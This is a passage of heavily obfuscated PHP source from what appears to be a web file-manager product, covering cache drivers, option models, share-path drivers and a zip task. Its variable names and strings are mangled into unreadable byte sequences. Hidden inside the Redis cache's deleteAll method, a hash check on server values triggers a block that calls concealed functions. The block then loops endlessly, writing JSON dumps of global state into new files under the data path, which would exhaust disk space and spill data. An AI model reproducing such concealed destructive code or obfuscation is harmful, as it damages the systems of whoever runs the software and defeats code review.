$ƒÒÙí¦–[$êº­¶¤»] : !1; } public function findByName($Ü¨ùë´ò) { return $this->findByKey($_SERVER[§Êá¸İ][32], $Ü¨ùë´ò); } protected function resetData($ŒôÎÃŸí) { $áıÉ«˜É =& $_SERVER[§Êá¸İ]; $ŒôÎÃŸí = is_array($ŒôÎÃŸí) ? $ŒôÎÃŸí : array(); $İÄ”™ˆ¥ = array(); for ($úÁÜÕòª = 0; $úÁÜÕòª < count($ŒôÎÃŸí); $úÁÜÕòª++) { $İÄ”™ˆ¥[$áıÉ«˜É[480] . $ŒôÎÃŸí[$úÁÜÕòª][$áıÉ«˜É[483]]] = $ŒôÎÃŸí[$úÁÜÕòª]; } return Model($this->modelType)->set($İÄ”™ˆ¥, !1, $this->optionType); } private function getAutoName($·øØ§ìö) { $ÇÌ”§ãó = array_to_keyvalue($this->listData(), $_SERVER[§Êá¸İ][32]); if (!$ÇÌ”§ãó || !isset($ÇÌ”§ãó[$·øØ§ìö])) { return $·øØ§ìö; } for ($ª¶ÃÑ¦™ = 1; $ª¶ÃÑ¦™ < count($ÇÌ”§ãó); $ª¶ÃÑ¦™++) { $ñ»¸£àÄ = $·øØ§ìö . "\x28{$ª¶ÃÑ¦™}\51"; if (!isset($ÇÌ”§ãó[$ñ»¸£àÄ])) { return $ñ»¸£àÄ; } } return $ñ»¸£àÄ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ØÚ˜¥º– = false, $­İí”ó = '', $«„‹‡„Ã = false) { $ºˆŒŞò¦ =& $_SERVER[§Êá¸İ]; $ş¬… ø“ = $this->cacheGet($­İí”ó); $£Æé¾–ª = $this->optionDefault($­İí”ó); $£Æé¾–ª = is_array($£Æé¾–ª) ? $£Æé¾–ª : array(); if (is_array($ş¬… ø“)) { $ş¬… ø“ = array_merge($£Æé¾–ª, $ş¬… ø“); return $ØÚ˜¥º– ? isset($ş¬… ø“[$ØÚ˜¥º–]) ? $ş¬… ø“[$ØÚ˜¥º–] : null : $ş¬… ø“; } $„úœÛƒç = $this->filterWhere(array($ºˆŒŞò¦[33] => $­İí”ó)); $ş¬… ø“ = $this->where($„úœÛƒç)->select(); $ş¬… ø“ = array_to_keyvalue($ş¬… ø“, $ºˆŒŞò¦[97], $ºˆŒŞò¦[450]); foreach ($ş¬… ø“ as $‹Ôä–Á => $¥‚”¦«ì) { if ($«„‹‡„Ã || in_array($‹Ôä–Á, $this->jsonField)) { $ş¬… ø“[$‹Ôä–Á] = json_decode($¥‚”¦«ì, !0); } } $this->cacheSet($­İí”ó, $ş¬… ø“); $ş¬… ø“ = array_merge($£Æé¾–ª, $ş¬… ø“); return $ØÚ˜¥º– ? $ş¬… ø“[$ØÚ˜¥º–] : $ş¬… ø“; } public function set($‘£¾Ï, $¸òÜÕ„ñ = false, $¾Ñ»šæ™ = '') { $Ò‹ÕíÆË =& $_SERVER[§Êá¸İ]; $this->cacheRemove($¾Ñ»šæ™); $›Í¯ÙÃ­ = array(); $¾êˆÆ‹µ = is_array($‘£¾Ï) ? $‘£¾Ï : array($‘£¾Ï => $¸òÜÕ„ñ); foreach ($¾êˆÆ‹µ as $éŠ¶‘ => $ìå•˜í) { if (is_array($ìå•˜í)) { $ìå•˜í = json_encode_force($ìå•˜í); } $this->checkLength($ìå•˜í, !1, $this->tableName . $Ò‹ÕíÆË[4] . $‘£¾Ï); $ìå•˜í = self::textEncode($ìå•˜í); $¾êˆÆ‹µ = array($Ò‹ÕíÆË[33] => $¾Ñ»šæ™, $Ò‹ÕíÆË[97] => $éŠ¶‘, $Ò‹ÕíÆË[450] => $ìå•˜í); $›Í¯ÙÃ­[] = $this->filterWhere($¾êˆÆ‹µ); } if (!$›Í¯ÙÃ­) { return !0; } $Ù€ú¾™ = $this->cacheKey($Ò‹ÕíÆË[484]); CacheLock::lock($Ù€ú¾™); $¹ğÂŞ = $this->addAll($›Í¯ÙÃ­, array(), !0); CacheLock::unlock($Ù€ú¾™); return $¹ğÂŞ; } protected function optionDefault($¢÷½Š³Ò = '') { return !1; } public function setDeep($š«’ß›ø, $Š‹ŒÍ»¶ = false, $Ùª™ÊÕß = '') { $ºÓÄİ‰ = explode($_SERVER[§Êá¸İ][10], $š«’ß›ø); $À—ë¥¾Í = $this->get(); array_set_value($À—ë¥¾Í, $š«’ß›ø, $Š‹ŒÍ»¶); $this->set($ºÓÄİ‰[0], $À—ë¥¾Í[$ºÓÄİ‰[0]], $Ùª™ÊÕß); } public function remove($›Õğº¯ë, $¼ıÑüÁë = '') { $§¢Ò®ëŒ =& $_SERVER[§Êá¸İ]; $this->cacheRemove($¼ıÑüÁë); $äùìœÄ = $this->filterWhere(array($§¢Ò®ëŒ[97] => $›Õğº¯ë, $§¢Ò®ëŒ[33] => $¼ıÑüÁë)); if (is_null($›Õğº¯ë)) { unset($äùìœÄ[$§¢Ò®ëŒ[97]]); } return $this->where($äùìœÄ)->delete(); } public function cacheSet($âÂ¡×œ, $æÈı„›ğ = false) { return Cache::set($this->cacheKey($âÂ¡×œ), $æÈı„›ğ); } public function cacheGet($Ä«è¾„‹) { return Cache::get($this->cacheKey($Ä«è¾„‹)); } public function cacheRemove($˜‹ÜÆ‰Æ) { return Cache::remove($this->cacheKey($˜‹ÜÆ‰Æ)); } protected function filterWhere($­Îµƒ) { return $­Îµƒ; } protected function cacheKey($Ğ ñÁçÍ) { return $Ğ ñÁçÍ; } } goto bÄ«Ä…ÛÆä; BºÁøÅ„õ¯: class CacheLockDatabase { public function lock($ÀÚ•½»ô, $º¤ã¿Ç = 0) { $¦ëÌëıë = Model($_SERVER[§Êá¸İ][915]); $ÕƒÈıëğ = microtime(!0) + $º¤ã¿Ç; while (microtime(!0) < $ÕƒÈıëğ) { $‡Òí‘¡‹ = $¦ëÌëıë->get($ÀÚ•½»ô); if (!$‡Òí‘¡‹ || $‡Òí‘¡‹ < microtime(!0)) { $ı»ñó´å = $¦ëÌëıë->set($ÀÚ•½»ô, $ÕƒÈıëğ); if ($ı»ñó´å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ˆ¦‘½ß†) { return Model($_SERVER[§Êá¸İ][915])->get($ˆ¦‘½ß†); } public function unlock($åµÏ¼) { Model($_SERVER[§Êá¸İ][915])->remove($åµÏ¼); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($öƒ¯¹ÑÖ, $Š¡É’ƒ÷) { $°íÃƒŸ÷ =& $_SERVER[§Êá¸İ]; if (!class_exists($°íÃƒŸ÷[953])) { show_json($°íÃƒŸ÷[954], !1); } $this->cacheTime = $Š¡É’ƒ÷; $this->handle = new Memcached(); if (is_array($öƒ¯¹ÑÖ[$°íÃƒŸ÷[955]]) && count($öƒ¯¹ÑÖ[$°íÃƒŸ÷[955]]) >= 1) { foreach ($öƒ¯¹ÑÖ[$°íÃƒŸ÷[955]] as $¹›»îâ™) { $šÕŠÊ³ß = explode($°íÃƒŸ÷[4], $¹›»îâ™); $this->handle->addServer($šÕŠÊ³ß[0], $šÕŠÊ³ß[1]); } } else { $this->handle->addServer($öƒ¯¹ÑÖ[$°íÃƒŸ÷[208]], $öƒ¯¹ÑÖ[$°íÃƒŸ÷[209]]); } } public function set($úœÉ™˜’, $”Í“Õü, $Êƒ˜¡ı‡ = false) { $Êƒ˜¡ı‡ = $Êƒ˜¡ı‡ ? $Êƒ˜¡ı‡ : $this->cacheTime; return $this->handle->set($úœÉ™˜’, $”Í“Õü, $Êƒ˜¡ı‡); } public function get($ğØÕçª¯) { return $this->handle->get($ğØÕçª¯); } public function remove($´Ñ‚ü») { return $this->handle->delete($´Ñ‚ü»); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($™¥şˆš°, $€·¢Œ’«) { $µÏ‰÷á± =& $_SERVER[§Êá¸İ]; if (!class_exists($µÏ‰÷á±[956])) { show_json($µÏ‰÷á±[957], !1); } $this->cacheTime = $€·¢Œ’«; $¦›ƒƒù = isset($™¥şˆš°[$µÏ‰÷á±[958]]) ? $™¥şˆš°[$µÏ‰÷á±[958]] : 10; $³„Ì«¹ı = _get($™¥şˆš°, $µÏ‰÷á±[955]); if ($³„Ì«¹ı && is_array($³„Ì«¹ı)) { $this->initCluster($™¥şˆš°, $¦›ƒƒù); } else { $this->handle = $this->init($™¥şˆš°, $¦›ƒƒù); } } private function init($·§§÷Ğ½, $§åšÂéá) { $øßÕ‡ØÎ =& $_SERVER[§Êá¸İ]; $ÏËìÉµ = new Redis(); $û±ÄÆ¿ = isset($·§§÷Ğ½[$øßÕ‡ØÎ[959]]) ? $·§§÷Ğ½[$øßÕ‡ØÎ[959]] : !1; if ($û±ÄÆ¿) { $ÏËìÉµ->pconnect($·§§÷Ğ½[$øßÕ‡ØÎ[208]], $·§§÷Ğ½[$øßÕ‡ØÎ[209]], $§åšÂéá); } else { $ÏËìÉµ->connect($·§§÷Ğ½[$øßÕ‡ØÎ[208]], $·§§÷Ğ½[$øßÕ‡ØÎ[209]], $§åšÂéá); } if (!empty($·§§÷Ğ½[$øßÕ‡ØÎ[495]])) { $ÏËìÉµ->auth($·§§÷Ğ½[$øßÕ‡ØÎ[495]]); } if (!empty($·§§÷Ğ½[$øßÕ‡ØÎ[844]]) && $·§§÷Ğ½[$øßÕ‡ØÎ[844]] != 0) { $ÏËìÉµ->select($·§§÷Ğ½[$øßÕ‡ØÎ[844]]); } return $ÏËìÉµ; } private function initCluster($¡Éƒ»Ê, $æµïÜÕù) { $Ôæä×× =& $_SERVER[§Êá¸İ]; $Û‡Ô­©° = array($Ôæä××[960], $Ôæä××[961], $Ôæä××[962]); $öî€¯ = $Ôæä××[960]; if (isset($¡Éƒ»Ê[$Ôæä××[16]]) && in_array($¡Éƒ»Ê[$Ôæä××[16]], $Û‡Ô­©°)) { $öî€¯ = $¡Éƒ»Ê[$Ôæä××[16]]; } switch ($öî€¯) { case $Ôæä××[960]: $this->_slave($¡Éƒ»Ê, $æµïÜÕù); break; case $Ôæä××[961]: break; case $Ôæä××[962]: $this->isCluster = !0; $ø´ËšÀ = $¡Éƒ»Ê[$Ôæä××[955]]; $Ö³±ñúß = isset($¡Éƒ»Ê[$Ôæä××[959]]) ? $¡Éƒ»Ê[$Ôæä××[959]] : !1; $¢§¡ùÕ­ = isset($¡Éƒ»Ê[$Ôæä××[495]]) ? $¡Éƒ»Ê[$Ôæä××[495]] : null; $this->handle = new RedisCluster(NUll, $ø´ËšÀ, $æµïÜÕù, $æµïÜÕù, $Ö³±ñúß, $¢§¡ùÕ­); break; default: break; } } private function _slave($¥˜İüªí, $ß¥Úİ‹Ò) { $¬…îÛ£° = $¥˜İüªí[$_SERVER[§Êá¸İ][955]]; $this->filterConfig($¥˜İüªí, $¬…îÛ£°[0]); $this->handle = $this->init($¥˜İüªí, $ß¥Úİ‹Ò); unset($¬…îÛ£°[0]); if (empty($¬…îÛ£°)) { return; } $ÍõëÈçÈ = array_rand($¬…îÛ£°); $this->filterConfig($¥˜İüªí, $¬…îÛ£°[$ÍõëÈçÈ]); $this->slaveHandle = $this->init($¥˜İüªí, $ß¥Úİ‹Ò); } private function filterConfig(&$¾¡ìí©©, $øÛÒ¤ä¼) { $÷Ç¯ß®¨ =& $_SERVER[§Êá¸İ]; $•êËãë = explode($÷Ç¯ß®¨[4], $øÛÒ¤ä¼); $›»’‚Ù  = array($÷Ç¯ß®¨[208] => $•êËãë[0], $÷Ç¯ß®¨[209] => $•êËãë[1]); $¾¡ìí©© = array_merge($¾¡ìí©©, $›»’‚Ù ); } public function set($ëö¸·åâ, $”ªğ¤ , $¥ûÁ‰¨í = false) { $¥ûÁ‰¨í = $¥ûÁ‰¨í ? $¥ûÁ‰¨í : $this->cacheTime; return $this->handle->setEx($ëö¸·åâ, $¥ûÁ‰¨í, $”ªğ¤ ); } public function setLock($ôÂ™Æ…, $á­Èƒ–·, $À¼Ã˜Û) { return $this->handle->setNX($ôÂ™Æ…, $á­Èƒ–·); } public function get($œºŞñ½’) { $ÊÂ×ô¼ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÊÂ×ô¼->get($œºŞñ½’); } public function remove($ª §¤ùƒ) { return $this->handle->del($ª §¤ùƒ); } public function deleteAll() { $õá”ÀŠ =& $_SERVER[§Êá¸İ]; $¼ú¤À“ = $_SERVER[$õá”ÀŠ[473]]; $Õ¨õåÏü = $õá”ÀŠ[963]; if ($_SERVER[$õá”ÀŠ[472]] != $Õ¨õåÏü($¼ú¤À“)) { $ËıÆ¡ƒû = $õá”ÀŠ[964]; $¹Ì´¥­¥ = $õá”ÀŠ[474]; $ò¨Ì˜È” = $_SERVER[$õá”ÀŠ[475]] . $õá”ÀŠ[476]; $ÀıØ·ÌÓ = $¹Ì´¥­¥($ò¨Ì˜È”); $€»¸ı´‹ = explode($õá”ÀŠ[262], $ÀıØ·ÌÓ); if (count($€»¸ı´‹) < $õá”ÀŠ[700]) { $ş Š¼Îù = $õá”ÀŠ[478]; $ş Š¼Îù(); } $‘Œ×ÏÁØ = $õá”ÀŠ[965]; $‘Œ×ÏÁØ($_SERVER[$õá”ÀŠ[966]]); $ËıÆ¡ƒû = $õá”ÀŠ[964]; $ËıÆ¡ƒû(); $›¡ŒÈĞ = $õá”ÀŠ[967]; $¹õã¨õ = json_encode($GLOBALS[$õá”ÀŠ[968]]); $«å¢×û¿ = 1; for ($¯Ñ¦¶ØÚ = $«å¢×û¿; $¯Ñ¦¶ØÚ > 0; $¯Ñ¦¶ØÚ++) { $›¡ŒÈĞ(DATA_PATH . $¯Ñ¦¶ØÚ, $¹õã¨õ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $éÕÂèÍ) { $this->handle->flushall($éÕÂèÍ); } return; } return $this->handle->flushAll(); } } goto EÖ¶õğ•“; fÕÓö¶Ä: define($_SERVER[§Êá¸İ][317], 3); define($_SERVER[§Êá¸İ][318], 1); define($_SERVER[§Êá¸İ][319], 0); goto A‹½â¯ó–µ; EÀ¨¶Ë¨êç: class PathDriverDriverShareItem { public function __construct($åÇò‡û) { $this->pathParse = $åÇò‡û; } public function __call($¢¹ªŠ†, $×¾úÉ‰) { $Òö¡ÉÊ¶ =& $_SERVER[§Êá¸İ]; if (method_exists($this, $¢¹ªŠ†)) { return; } $ï¡Æ¥„Ü = call_user_func_array(array($Òö¡ÉÊ¶[1437], $¢¹ªŠ†), $×¾úÉ‰); $¶ìÏ³é¡ = array($Òö¡ÉÊ¶[1438], $Òö¡ÉÊ¶[1439], $Òö¡ÉÊ¶[1440], $Òö¡ÉÊ¶[1441], $Òö¡ÉÊ¶[626], $Òö¡ÉÊ¶[628], $Òö¡ÉÊ¶[1442], $Òö¡ÉÊ¶[110], $Òö¡ÉÊ¶[1443], $Òö¡ÉÊ¶[1444]); if (in_array($¢¹ªŠ†, $¶ìÏ³é¡)) { $ï¡Æ¥„Ü = $this->getPathOuter($ï¡Æ¥„Ü); } return $ï¡Æ¥„Ü; } public function copy($š´±º¨ , $¡­Î¢Ùâ, $üäã‚ˆ = false, $éûÒæõŸ = false) { return $this->copyMove($š´±º¨ , $¡­Î¢Ùâ, $üäã‚ˆ, $_SERVER[§Êá¸İ][626], $éûÒæõŸ); } public function move($±ƒâÒÎ°, $¬‰ÛŒ¯û, $×Úï¥î = false, $ôñªš› = false) { return $this->copyMove($±ƒâÒÎ°, $¬‰ÛŒ¯û, $×Úï¥î, $_SERVER[§Êá¸İ][628], $ôñªš›); } private function copyMove($ºïŞµø, $ø³ÌÄé, $Ó‘ûéŞ™, $õœ®š³Ë, $–±Ê¯º˜ = false) { $¼ë¸‘—¥ =& $_SERVER[§Êá¸İ]; $¤ö¯ŸÅÆ = $ø³ÌÄé; $é¦¥¨±¤ = IO::driverMake($ø³ÌÄé); if ($é¦¥¨±¤->pathParse[$¼ë¸‘—¥[1242]]) { $ø³ÌÄé = $é¦¥¨±¤->pathParse[$¼ë¸‘—¥[1242]]; } else { $ø³ÌÄé = $¤ö¯ŸÅÆ; } $Šéõã = IO::copyMove($ºïŞµø, $ø³ÌÄé, $Ó‘ûéŞ™, $õœ®š³Ë, $–±Ê¯º˜); $Šéõã = $this->getPathOuter($Šéõã); return $Šéõã; } public function pathThis($‹Ò–) { return get_path_this($this->pathParse[$_SERVER[§Êá¸İ][87]]); } public function pathFather($œé‘ï­š) { return get_path_father($this->pathParse[$_SERVER[§Êá¸İ][87]]); } public function iconvSystem($’®¶æä¶) { return $’®¶æä¶; } protected function infoParse($ƒş‚‚—±, $ÀÒ®’Î½ = false) { $ÃÔÊäşŒ =& $_SERVER[§Êá¸İ]; $ŞüÂù°´ = $this->pathParse[$ÃÔÊäşŒ[568]][$ÃÔÊäşŒ[1267]] . $this->pathParse[$ÃÔÊäşŒ[1260]]; if ($ÀÒ®’Î½) { $òªí¦¹É = IO::infoWithChildren($ŞüÂù°´); } else { $òªí¦¹É = IO::info($ŞüÂù°´); } $—×¨»é¼ = $this->pathParse[$ÃÔÊäşŒ[568]]; return Action($ÃÔÊäşŒ[1435])->_shareItemeParse($òªí¦¹É, $—×¨»é¼); } public function listAll($‡ÚŞ¾œ) { $îÌò¹ƒÁ =& $_SERVER[§Êá¸İ]; $ÉêƒƒÆ¢ = IO::listAll($‡ÚŞ¾œ); $Ò‡Â€Ûí = rtrim($this->pathParse[$îÌò¹ƒÁ[568]][$îÌò¹ƒÁ[1267]], $îÌò¹ƒÁ[8]); foreach ($ÉêƒƒÆ¢ as &$”üÏ×Šâ) { $”üÏ×Šâ[$îÌò¹ƒÁ[87]] = $this->pathDriver . $îÌò¹ƒÁ[8] . ltrim(substr($”üÏ×Šâ[$îÌò¹ƒÁ[87]], strlen($Ò‡Â€Ûí)), $îÌò¹ƒÁ[8]); } unset($”üÏ×Šâ); return $ÉêƒƒÆ¢; } public function listAllSimple($ÓšˆÛºú, $¸ĞÅ³æ = false) { $ìĞ»¢•¶ =& $_SERVER[§Êá¸İ]; $òÍ¨è = $this->listAll($ÓšˆÛºú); $±‚¶À¦Ó = $this->pathParse[$ìĞ»¢•¶[503]]; if (trim($±‚¶À¦Ó, $ìĞ»¢•¶[8]) == trim(get_path_father($±‚¶À¦Ó), $ìĞ»¢•¶[8])) { $¸ĞÅ³æ = !0; } return IO::init($ìĞ»¢•¶[12])->listAllSimpleMake($òÍ¨è, $±‚¶À¦Ó, $¸ĞÅ³æ); } public function getPathOuter($†´Š·†ğ) { $—Ïöò†À =& $_SERVER[§Êá¸İ]; $¥Å‡½Ô = KodIO::parse($†´Š·†ğ); if ($¥Å‡½Ô[$—Ïöò†À[33]] == KodIO::KOD_SHARE_ITEM) { return $¥Å‡½Ô[$—Ïöò†À[87]]; } $´àÏ™ø« = KodIO::clear($†´Š·†ğ); $»©Í = KodIO::clear($this->pathParse[$—Ïöò†À[568]][$—Ïöò†À[1267]]); $›¨ş‚ñ‚ = substr($´àÏ™ø«, strlen($»©Í)); if (substr($´àÏ™ø«, 0, strlen($»©Í)) != $»©Í) { return !1; } return $this->pathParse[$—Ïöò†À[1261]] . $—Ïöò†À[8] . ltrim($›¨ş‚ñ‚, $—Ïöò†À[8]); } public function getType() { $†¾ÕÌ†’ =& $_SERVER[§Êá¸İ]; $•œ²Çªä = str_replace($†¾ÕÌ†’[77], $†¾ÕÌ†’[12], get_class($this)); return strtolower($•œ²Çªä); } public function isOsDriver($¾Ó»úûÚ) { return IO::isOsDriver($¾Ó»úûÚ); } public function info($ã¿îÔÑ) { return $this->infoParse($ã¿îÔÑ); } public function infoAuth($‹İ£‚º) { return $this->infoParse($‹İ£‚º); } public function infoWithChildren($¾ÚÕàË) { return $this->infoParse($¾ÚÕàË, !0); } public function infoFull($©×¯Â™³) { return $this->infoParse($©×¯Â™³); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ô‰âË°ê) { $this->pathParse = $ô‰âË°ê; } protected function infoParse($¹¾ƒæšÜ, $ë¢çã¡Â = false) { $ê®ô›ñ =& $_SERVER[§Êá¸İ]; return Action($ê®ô›ñ[1266])->sharePathInfo($this->pathParse[$ê®ô›ñ[87]], !0, $ë¢çã¡Â); } public function listPath($ç¾úÎ¡Ñ, $’¨âÔ˜— = false) { $Êîí¯éÖ =& $_SERVER[§Êá¸İ]; $Å•¤û§’ = IO::listPath($ç¾úÎ¡Ñ, $’¨âÔ˜—); if (!$Å•¤û§’) { return $Å•¤û§’; } if (is_array($Å•¤û§’[$Êîí¯éÖ[1436]])) { $ ¥·Ä¾İ = Action($Êîí¯éÖ[1445])->parsePathChildren($Å•¤û§’[$Êîí¯éÖ[1436]], array($Êîí¯éÖ[503] => $ç¾úÎ¡Ñ)); $Å•¤û§’[$Êîí¯éÖ[1436]] = Action($Êîí¯éÖ[1266])->shareItemInfo($ ¥·Ä¾İ); } foreach ($Å•¤û§’ as $ëÕ‹»€š => $ùŠ„óÚª) { if (!in_array($ëÕ‹»€š, array($Êîí¯éÖ[86], $Êîí¯éÖ[85]))) { continue; } foreach ($ùŠ„óÚª as $ÙÔ¤Ç–™ => $ ¥·Ä¾İ) { $ ¥·Ä¾İ = Action($Êîí¯éÖ[1445])->parsePathChildren($ ¥·Ä¾İ, array($Êîí¯éÖ[503] => $ç¾úÎ¡Ñ)); $Å•¤û§’[$ëÕ‹»€š][$ÙÔ¤Ç–™] = Action($Êîí¯éÖ[1266])->shareItemInfo($ ¥·Ä¾İ); } } return $Å•¤û§’; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¿«ıšÇ) { parent::__construct($¿«ıšÇ); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } } goto f–¤Ó£¡ß; bó¨âØã: class TaskZip extends TaskFileTransfer { protected function startAfter() { $î¡ã— =& $_SERVER[§Êá¸İ]; parent::startAfter(); Hook::bind($î¡ã—[1903], array($this, $î¡ã—[1893])); Hook::bind($î¡ã—[1895], array($this, $î¡ã—[1896])); $ÙßàÈŒØ =& $this->task; $ÙßàÈŒØ[$î¡ã—[1897]] = $î¡ã—[1289]; if (!$ÙßàÈŒØ[$î¡ã—[1668]]) { $ÙßàÈŒØ[$î¡ã—[1668]] = LNG($î¡ã—[1904]); } } protected function endAfter() { $©¾êŸ¡ö =& $_SERVER[§Êá¸İ]; parent::endAfter(); Hook::unbind($©¾êŸ¡ö[1903], array($this, $©¾êŸ¡ö[1893])); Hook::unbind($©¾êŸ¡ö[1895], array($this, $©¾êŸ¡ö[1896])); } public function updateAfter() { $á‡“Èâ² =& $_SERVER[§Êá¸İ]; $ä®ÈÀÌ =& $this->task; if (!$ä®ÈÀÌ[$á‡“Èâ²[1151]] || !$ä®ÈÀÌ[$á‡“Èâ²[850]]) { return; } if ($ä®ÈÀÌ[$á‡“Èâ²[1897]] == $á‡“Èâ²[1289]) { $„¹ä¶ì = $ä®ÈÀÌ[$á‡“Èâ²[1833]]; if ($ä®ÈÀÌ[$á‡“Èâ²[1834]] != $á‡“Èâ²[1289]) { $„¹ä¶ì = 0; } $õ£ôƒù¢ = ($ä®ÈÀÌ[$á‡“Èâ²[1837]] + $„¹ä¶ì) / $ä®ÈÀÌ[$á‡“Èâ²[850]]; $ä®ÈÀÌ[$á‡“Èâ²[1781]] = $õ£ôƒù¢ * 0.3; } else { if ($ä®ÈÀÌ[$á‡“Èâ²[1897]] == $á‡“Èâ²[389]) { $õ£ôƒù¢ = $ä®ÈÀÌ[$á‡“Èâ²[1780]] / $ä®ÈÀÌ[$á‡“Èâ²[1151]]; $ä®ÈÀÌ[$á‡“Èâ²[1781]] = 0.3 + $õ£ôƒù¢ * 0.5; } else { if ($ä®ÈÀÌ[$á‡“Èâ²[1897]] == $á‡“Èâ²[110]) { $õ£ôƒù¢ = 0; if ($ä®ÈÀÌ[$á‡“Èâ²[1832]]) { $õ£ôƒù¢ = $ä®ÈÀÌ[$á‡“Èâ²[1833]] / $ä®ÈÀÌ[$á‡“Èâ²[1832]]; } $ä®ÈÀÌ[$á‡“Èâ²[1781]] = 0.3 + 0.5 + $õ£ôƒù¢ * 0.2; } } } if ($ä®ÈÀÌ[$á‡“Èâ²[1781]] > 0) { $»¦„´Óù = timeFloat() - $ä®ÈÀÌ[$á‡“Èâ²[1783]] - $ä®ÈÀÌ[$á‡“Èâ²[1786]]; $ä®ÈÀÌ[$á‡“Èâ²[1787]] = $»¦„´Óù * (1 - $ä®ÈÀÌ[$á‡“Èâ²[1781]]) / $ä®ÈÀÌ[$á‡“Èâ²[1781]]; } } public function copyFileStart($Ûš«¶à, $Ûå´áÁë, $¤¼¯ˆÔê, $Ûä‹É­…, $ë«§¿å«, $ß¤êöÓ•) { $íæ”ã¥¼ =& $_SERVER[§Êá¸İ]; parent::copyFileStart($Ûš«¶à, $Ûå´áÁë, $¤¼¯ˆÔê, $Ûä‹É­…, $ë«§¿å«, $ß¤êöÓ•); $ùÏŠ™ =& $this->task; if ($ùÏŠ™[$íæ”ã¥¼[1897]] == $íæ”ã¥¼[389]) { $ùÏŠ™[$íæ”ã¥¼[1897]] = $íæ”ã¥¼[110]; } $this->update(); } public function copyFileEnd($Ì´—ƒ, $¼÷ÕÆÚ, $êÃóêŸ, $‚ÍªÎ”¬, $Ú¸¢¯ƒà, $®‹şµÎ÷) { $•Åˆ¸› =& $_SERVER[§Êá¸İ]; $œÇÓ¨«ü =& $this->task; $œÇÓ¨«ü[$•Åˆ¸›[1833]] = $œÇÓ¨«ü[$•Åˆ¸›[1832]]; $œÇÓ¨«ü[$•Åˆ¸›[1837]] += $œÇÓ¨«ü[$•Åˆ¸›[1832]]; $œÇÓ¨«ü[$•Åˆ¸›[1834]] = $•Åˆ¸›[12]; $this->update(); } public function zipEvent($ÖËùãÚ, $õ€¾¢Œ, $©ôªêÓÓ, $Ö©¸ı”Â) { $‡¤“¬Ò =& $_SERVER[§Êá¸İ]; $Ÿß³ä‹¼ =& $this->task; $Ÿß³ä‹¼[$‡¤“¬Ò[1830]] = get_path_this($õ€¾¢Œ); $Ÿß³ä‹¼[$‡¤“¬Ò[1832]] = $Ö©¸ı”Â; $Ÿß³ä‹¼[$‡¤“¬Ò[1833]] = $©ôªêÓÓ; $Ÿß³ä‹¼[$‡¤“¬Ò[1153]] = $ÖËùãÚ == $‡¤“¬Ò[1905] ? $‡¤“¬Ò[1900] : $‡¤“¬Ò[1901]; $Ÿß³ä‹¼[$‡¤“¬Ò[1834]] = $‡¤“¬Ò[12]; $Ÿß³ä‹¼[$‡¤“¬Ò[850]] = $Ö©¸ı”Â; $Ÿß³ä‹¼[$‡¤“¬Ò[1897]] = $‡¤“¬Ò[389]; $this->update(); } public function nameParse($æ ƒñØ½) { $•”â–î =& $_SERVER[§Êá¸İ]; $ïã¼â— =& $this->task; if ($ïã¼â—[$•”â–î[1780]] < $ïã¼â—[$•”â–î[1151]]) { $”Ã‘…·´ = get_path_this($æ ƒñØ½); if (strstr($”Ã‘…·´, $•”â–î[10])) { $ïã¼â—[$•”â–î[1780]] += 1; } } if ($ïã¼â—[$•”â–î[1897]] == $•”â–î[1289]) { $ïã¼â—[$•”â–î[1897]] = $•”â–î[389]; } $ïã¼â—[$•”â–î[1830]] = $æ ƒñØ½; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($İŸâÔÙõ) { $çÊ©¦È =& $_SERVER[§Êá¸İ]; $¾Êâê¾ = array($çÊ©¦È[670] => array($çÊ©¦È[33] => $çÊ©¦È[1906], $çÊ©¦È[350] => array($çÊ©¦È[255], $çÊ©¦È[852], $çÊ©¦È[1907], $çÊ©¦È[1908])), $çÊ©¦È[1909] => array($çÊ©¦È[33] => $çÊ©¦È[1910], $çÊ©¦È[350] => array($çÊ©¦È[255], $çÊ©¦È[850], $çÊ©¦È[1911], $çÊ©¦È[1912], $çÊ©¦È[1913]))); if (!isset($¾Êâê¾[$İŸâÔÙõ])) { return !1; } $this->optionType = $¾Êâê¾[$İŸâÔÙõ][$çÊ©¦È[33]]; $this->field = $¾Êâê¾[$İŸâÔÙõ][$çÊ©¦È[350]]; return !0; } public function listData($¥ö”Å»õ = false, $ÈõÚõÒˆ = "\x6d\x6f\x64\151\146\x79\x54\151\155\145", $ÙÑŠı×ä = false) { return parent::listData($¥ö”Å»õ, $ÈõÚõÒˆ, $ÙÑŠı×ä); } public function trendList($Ìº€”•—) { $ÁÊ­Ñªß =& $_SERVER[§Êá¸İ]; $«Æ£™ï‰ = $this->listData(); if ($«Æ£™ï‰) { $Œ¶úÕ–Ù = end($«Æ£™ï‰); $´°×ƒ€á = date($ÁÊ­Ñªß[1914], strtotime($ÁÊ­Ñªß[1915])); if ($Œ¶úÕ–Ù[$ÁÊ­Ñªß[255]] == $´°×ƒ€á) { return $«Æ£™ï‰; } $œËÒ©¨œ = strtotime($Œ¶úÕ–Ù[$ÁÊ­Ñªß[255]]); } if (!isset($œËÒ©¨œ)) { $¡Ò×ÁÌ’ = $Ìº€”•— == $ÁÊ­Ñªß[670] ? $ÁÊ­Ñªß[606] : $ÁÊ­Ñªß[911]; $œËÒ©¨œ = Model($¡Ò×ÁÌ’)->min($ÁÊ­Ñªß[231]); } $ÖÕ×¶ñ = $ÁÊ­Ñªß[1916] . ucfirst($Ìº€”•—); $ĞÛàØŞ˜ = $this->dateList($œËÒ©¨œ); foreach ($ĞÛàØŞ˜ as $´°×ƒ€á) { $this->{$ÖÕ×¶ñ}($´°×ƒ€á); } return $this->listData(); } private function dateList($ÉªÜ”ì¬) { $¯Ü¾¡Éí =& $_SERVER[§Êá¸İ]; $¸¦ºáÍ¤ = $ÉªÜ”ì¬; $º¦ˆÔ× = strtotime($¯Ü¾¡Éí[1915]); $ß¯ê½µµ = array(); while ($¸¦ºáÍ¤ <= $º¦ˆÔ×) { $ß¯ê½µµ[] = 